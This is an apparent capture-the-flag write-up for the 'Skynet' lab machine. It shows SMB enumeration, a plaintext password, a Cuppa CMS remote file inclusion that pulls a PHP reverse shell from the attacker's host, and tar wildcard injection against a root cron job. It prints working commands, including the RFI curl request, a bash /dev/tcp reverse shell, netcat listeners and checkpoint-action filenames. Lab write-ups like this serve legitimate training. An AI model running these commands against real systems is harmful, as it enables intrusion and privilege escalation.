Skynet
---

Starting with a nmap 

<img width="714" height="683" alt="image" src="https://github.com/user-attachments/assets/19d75be2-657d-4074-96dd-7c8b0605bb3e" />

the results of the gobuster are not satisfying ..

<img width="703" height="544" alt="image" src="https://github.com/user-attachments/assets/6103fc06-f2d9-427d-9dc0-490cb372b77e" />

looking it was the smb 1.0 looking for the eternalblue exploit but it wasn't

<img width="703" height="260" alt="image" src="https://github.com/user-attachments/assets/6f20f204-6e1f-45aa-8a35-a73a50faabe5" />


so the anonymous connection on smb was succesful


<img width="703" height="199" alt="image" src="https://github.com/user-attachments/assets/602e1ef6-bd3a-4421-99be-479c504f5a71" />

we got the attention.txt


<img width="703" height="151" alt="image" src="https://github.com/user-attachments/assets/e9ab25ae-f57c-4e37-a163-6afd655f635c" />

and we also got the logs, and in one file we have a bunch of passwords


<img width="278" height="598" alt="image" src="https://github.com/user-attachments/assets/c60eb463-3a74-498a-a716-55d02eba6103" />


so we tried to brute force the admin login page, but it didnt work

<img width="722" height="260" alt="image" src="https://github.com/user-attachments/assets/a3d76402-b05c-421b-8598-05dd35b441c4" />


aslo tried to brute force the smb, the same thing .. 

actually .. it was the first password on the log1.txt, we just tried the false login 

username : milesdyson 
so once in the mail squirrell

<img width="730" height="208" alt="image" src="https://github.com/user-attachments/assets/4018c7b2-1bc2-40e3-b783-ecba309e1961" />


we have the smb password 

<img width="730" height="208" alt="image" src="https://github.com/user-attachments/assets/9dd10fdb-7839-4d04-a427-2ea32b02c538" />

```
)s{A&2Z=F^n_E.B`
```

inside of the smb share with the follwing command:
```
smbclient //10.130.172.8/milesdyson -U milesdyson    
```

<img width="714" height="415" alt="image" src="https://github.com/user-attachments/assets/d5ba64c3-86a8-466a-afdd-5ab3e4ad963a" />

inside the notes share we see this :

<img width="714" height="677" alt="image" src="https://github.com/user-attachments/assets/fe2bb4b0-0710-4242-8150-b93325a2a155" />

and we have this file ''important.txt""

<img width="714" height="175" alt="image" src="https://github.com/user-attachments/assets/7b842660-cd78-462d-a838-d4570bf29f72" />

idk if it's really important ..

so we go to the hidden directory on the web server

```
http://skynet.thm/45kra24zxs28v3yd
```

and we run a gobuster on it

```
gobuster dir -u http://skynet.thm/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt
```

we find an `/administrator` directory, and inside it's a **Cuppa CMS** login page

Cuppa CMS is vulnerable to a **Remote File Inclusion (RFI)** via `alertConfigField.php`

so first we copy a php reverse shell to our workspace

```
cp /opt/lists/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php /workspace/shell.php
```

we edit the file to put our tun0 IP and port 4444

```
sed -i "s/127.0.0.1/192.168.223.161/" /workspace/shell.php
sed -i "s/CHANGETHIS/192.168.223.161/" /workspace/shell.php
```

then we start a http server to host the shell

```
python3 -m http.server 8888
```

we start our listener in another terminal

```
nc -lvnp 4444
```

and we trigger the RFI

the file `alertConfigField.php` in Cuppa CMS has a parameter called `urlConfig` that is supposed to load a local config file, but it doesn't sanitize the input at all. It just takes whatever URL you give it and includes it directly with PHP. So instead of giving it a local file, we give it a remote URL pointing to our machine — that's the **Remote File Inclusion (RFI)**. The target server fetches our `shell.php` from our http server (port 8888) and executes it as PHP on its side. Inside `shell.php` there's a reverse connection back to our listener (port 4444). So two things happen: port 8888 serves the file, port 4444 receives the shell.

```
curl "http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.223.161:8888/shell.php"
```

and we got a shell as **www-data**

now for **privilege escalation**, we check the crontab

```
cat /etc/crontab
```

there's a cron running every minute as **root**

```
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```

and the backup script does this

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

the wildcard `*` in tar is exploitable, it's called **tar wildcard injection** — tar interprets filenames as options

so we create our payload in `/var/www/html`

```
cd /var/www/html
printf '#!/bin/bash\nbash -i >& /dev/tcp/192.168.223.161/5555 0>&1\n' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=bash shell.sh"
```

we start a new listener

```
nc -lvnp 5555
```

we wait about 1 minute and we get a shell as **root**

```
cd /root
cat root.txt

<img width="399" height="204" alt="image" src="https://github.com/user-attachments/assets/4002d3c6-163f-4c8f-89d5-59a948aaf015" />




 
